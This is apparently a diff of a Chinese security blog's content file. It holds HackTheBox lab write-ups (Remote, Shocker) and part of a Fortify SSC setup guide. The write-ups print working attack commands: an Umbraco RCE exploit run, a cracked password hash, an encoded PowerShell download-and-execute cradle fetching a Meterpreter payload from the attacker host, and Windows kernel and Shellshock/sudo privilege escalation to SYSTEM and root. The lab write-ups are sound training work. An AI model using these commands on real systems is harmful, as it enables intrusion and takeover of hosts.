AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA==</span><br><span class="line">[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (1383 bytes)</span><br><span class="line">[*] 10.10.10.180     web_delivery - Delivering Payload (3703 bytes)</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.30:4446 -&gt; 10.10.10.180:49698) at 2025-02-23 23:07:25 +0800</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @  10.10.16.30:4446 -&gt; 10.10.10.</span><br><span class="line">                                      REMOTE                       180:49698 (10.10.10.180)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : REMOTE</span><br><span class="line">OS              : Windows Server 2019 (10.0 Build 17763).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 0</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>post/multi/recon/local_exploit_suggester</code>  收集信息，查找可以提权的脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; use post/multi/recon/local_exploit_suggester </span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br><span class="line">[*] 10.10.10.180 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/windows...</span><br><span class="line">[*] 10.10.10.180 - 203 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2019</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[*] Running check method <span class="keyword">for</span> exploit 48 / 48</span><br><span class="line">[*] 10.10.10.180 - Valid modules <span class="keyword">for</span> session 1:</span><br><span class="line">============================</span><br></pre></td></tr></table></figure>
+
+<p>根据查找结果使用 <code>windows/local/cve_2024_35250_ks_driver</code> 进行提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> LHOST tun0 </span><br><span class="line">LHOST =&gt; 10.10.16.30</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> LPORT 7777</span><br><span class="line">LPORT =&gt; 7777</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:7777 </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019</span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[*] The notepad path is: C:\Windows\System32\notepad.exe</span><br><span class="line">[*] The notepad pid is: 4628</span><br><span class="line">[*] Reflectively injecting the DLL into 4628...</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.16.30:7777 -&gt; 10.10.10.180:49703) at 2025-02-23 23:26:34 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\Public\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Shocker</title>
+    <url>/Hackthebox/htb/htb-shocker/</url>
+    <content><![CDATA[<style>.lusfvfmtukdk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="lusfvfmtukdk">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-shocker/image-20250216093127462.png" class="" title="Nmap">
+
+<p>开放了80(HTTP) 和2222(SSH)</p>
+<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>使用dirb进行目录猜解，发现 <code>/cgi-bin/</code>目录</p>
+<img src="/Hackthebox/htb/htb-shocker/image-20250216095828722.png" class="" title="dirb">
+
+<p>然后使用Fuff 继续猜解，找到一个 <code>user.sh</code></p>
+<img src="/Hackthebox/htb/htb-shocker/image-20250216095724470.png" class="" title="Fuff">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> 模块</p>
+<img src="/Hackthebox/htb/htb-shocker/image-20250216101417329.png" class="" title="GetShell">
+
+
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 发现可以利用perl 进行提权 <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
+<img src="/Hackthebox/htb/htb-shocker/image-20250216103049798.png" class="" title="GetShell">
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">&#x2F;home&#x2F;shelly&#x2F;user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>Shellshock</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Tenten</title>
     <url>/Hackthebox/htb/htb-tenten/</url>
-    <content><![CDATA[<style>.fkyjdsvzztfq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="fkyjdsvzztfq">
+    <content><![CDATA[<style>.hcidvaqvlixs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="hcidvaqvlixs">
 
 <span id="more"></span>
 
@@ -1234,77 +1321,118 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Remote</title>
-    <url>/Hackthebox/htb/htb-remote/</url>
-    <content><![CDATA[<style>.hjmvphdrcgcx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="hjmvphdrcgcx">
-
+    <title>Fortify SSC 24.X 搭建</title>
+    <url>/DevSecOps/tools/fortifyssc/</url>
+    <content><![CDATA[<blockquote>
+<p>Fortify Software Security Center 是一款基于浏览器的产品，可在整个软件开发生命周期中提供一组功能，以自动检测应用程序中的安全漏洞。它通过提供来自 OpenText™ Fortify Static Code Analyzer、OpenText™ Fortify ScanCentral SAST、OpenText™ Fortify ScanCentral DAST 和 Sonatype 的关联数据，帮助安全和开发团队协同工作，通过其协作在线环境快速准确地解决安全漏洞。</p>
+</blockquote>
 <span id="more"></span>
 
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage.png" class="">
+
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
+<li>系统：Windows Server 2022</li>
+<li>软件： Apache Tomcat 9.0.x 、 JDK 17、Fortify Software Security Center 24.2</li>
+<li>数据库： MySQL 8.0.x </li>
+<li>账号： 管理员权限</li>
+</ul>
+<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="安装并配置JDK环境"><a href="#安装并配置JDK环境" class="headerlink" title="安装并配置JDK环境"></a>安装并配置JDK环境</h4><p>安装JDK17，配置JDK环境变量，打开命令行输入 java、javac、java - version均有相应回显</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-1.png" class="" title="jdk环境">
+
+<h4 id="安装并配置MySQL"><a href="#安装并配置MySQL" class="headerlink" title="安装并配置MySQL"></a>安装并配置MySQL</h4><p>安装MySQL，选择Custom</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-2.png" class="" title="安装Mysql">
+
+
+
+<p>安装完成后修改my.ini文件(必需)</p>
+<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-3.png" class="" title="my.ini">
+<p>在<code>[mysqld]</code>部分修改</p>
 <table>
 <thead>
 <tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
+<th>选项</th>
+<th>值</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">Windows</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.10.180 -sV  -p- -T4 --min-rate 1000 -e tun0 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:44 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.180</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65516 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           Microsoft ftpd</span><br><span class="line">80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">111/tcp   open     rpcbind       2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">2049/tcp  open     nlockmgr      1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">15264/tcp filtered unknown</span><br><span class="line">22011/tcp filtered unknown</span><br><span class="line">47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49680/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">53739/tcp filtered unknown</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 251.51 seconds</span><br></pre></td></tr></table></figure>
-
-<p>首先尝试FTP(21)匿名登录，啥也没有，然后对NFS(2049)进行测试，发现网站备份文件，挂载后可以查找到admin凭证</p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ showmount -e 10.10.10.180              </span><br><span class="line">Export list <span class="keyword">for</span> 10.10.10.180:</span><br><span class="line">/site_backups (everyone)</span><br><span class="line">$ <span class="built_in">mkdir</span> /tmp/site_backups </span><br><span class="line">$ <span class="built_in">sudo</span> mount -t nfs 10.10.10.180:/site_backups /tmp/site_backups</span><br><span class="line">$ <span class="built_in">cd</span> /tmp/site_backups </span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">App_Browsers  aspnet_client  css           Media    Umbraco_Client</span><br><span class="line">App_Data      bin            default.aspx  scripts  Views</span><br><span class="line">App_Plugins   Config         Global.asax   Umbraco  Web.config</span><br><span class="line">$ <span class="built_in">cd</span> App_Data </span><br><span class="line">strings Umbraco.sdf | grep admin</span><br><span class="line">Administratoradmindefaulten-US</span><br><span class="line">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d</span><br><span class="line">Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<p>将获取到的密码hash进行破解，将收集到的用户名密码备用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;b8be16afba8c314ad33d812f22a04991b90e2aaa&#x27;</span> &gt; sha1  </span><br><span class="line">$ john sha1 --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=8</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">baconandcheese   (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-02-23 21:45) 1.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1..bacon918</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.                          </span><br></pre></td></tr></table></figure>
-
-<p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.10.180 remote.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts </span><br></pre></td></tr></table></figure>
-
-<img src="/Hackthebox/htb/htb-remote/image-20250223220027043.png" class="" title="访问网站">
-
-<p>使用收集到的用户名密码，登录网站，获取网站版本</p>
-<img src="/Hackthebox/htb/htb-remote/image-20250223220241146.png" class="" title="登录页面">
-
-<img src="/Hackthebox/htb/htb-remote/image-20250223220501688.png" class="" title="查看版本">
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python exploit.py -u admin@htb.local -p baconandcheese -w <span class="string">&#x27;http://remote.htb&#x27;</span> -i 10.10.16.30</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to :: on port 4444: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port 49695</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to :: on port 4445: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port 49696</span><br><span class="line">[*] Logging <span class="keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin</span><br><span class="line">[*] Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">PS C:\windows\system32\inetsrv&gt; <span class="built_in">whoami</span></span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line">PS C:\windows\system32\inetsrv&gt;  </span><br></pre></td></tr></table></figure>
-
-<p>将shell 转移到msfconsole：使用<code>multi/script/web_delivery</code> 复制生成的powershell链接，在获取到的shell 上执行，成功获取到shell，查看系统信息为 Windows Server 2019 (10.0 Build 17763)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Python</span><br><span class="line">    1   PHP</span><br><span class="line">    2   PSH</span><br><span class="line">    3   Regsvr32</span><br><span class="line">    4   pubprn</span><br><span class="line">    5   SyncAppvPublishingServer</span><br><span class="line">    6   PSH (Binary)</span><br><span class="line">    7   Linux</span><br><span class="line">    8   Mac OS X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LPORT 4446</span><br><span class="line">LPORT =&gt; 4446</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST tun0 </span><br><span class="line">LHOST =&gt; 10.10.16.30</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> SRVPORT 8088</span><br><span class="line">SRVPORT =&gt; 8088</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:4446 </span><br><span class="line">[*] Using URL: http://10.10.16.30:8088/1JHqco9l</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA==</span><br><span class="line">[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (1383 bytes)</span><br><span class="line">[*] 10.10.10.180     web_delivery - Delivering Payload (3703 bytes)</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.30:4446 -&gt; 10.10.10.180:49698) at 2025-02-23 23:07:25 +0800</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @  10.10.16.30:4446 -&gt; 10.10.10.</span><br><span class="line">                                      REMOTE                       180:49698 (10.10.10.180)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : REMOTE</span><br><span class="line">OS              : Windows Server 2019 (10.0 Build 17763).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 0</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>post/multi/recon/local_exploit_suggester</code>  收集信息，查找可以提权的脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; use post/multi/recon/local_exploit_suggester </span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br><span class="line">[*] 10.10.10.180 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/windows...</span><br><span class="line">[*] 10.10.10.180 - 203 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2019</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[*] Running check method <span class="keyword">for</span> exploit 48 / 48</span><br><span class="line">[*] 10.10.10.180 - Valid modules <span class="keyword">for</span> session 1:</span><br><span class="line">============================</span><br></pre></td></tr></table></figure>
-
-<p>根据查找结果使用 <code>windows/local/cve_2024_35250_ks_driver</code> 进行提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> LHOST tun0 </span><br><span class="line">LHOST =&gt; 10.10.16.30</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; <span class="built_in">set</span> LPORT 7777</span><br><span class="line">LPORT =&gt; 7777</span><br><span class="line">msf6 exploit(windows/local/cve_2024_35250_ks_driver) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:7777 </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. ks.sys is 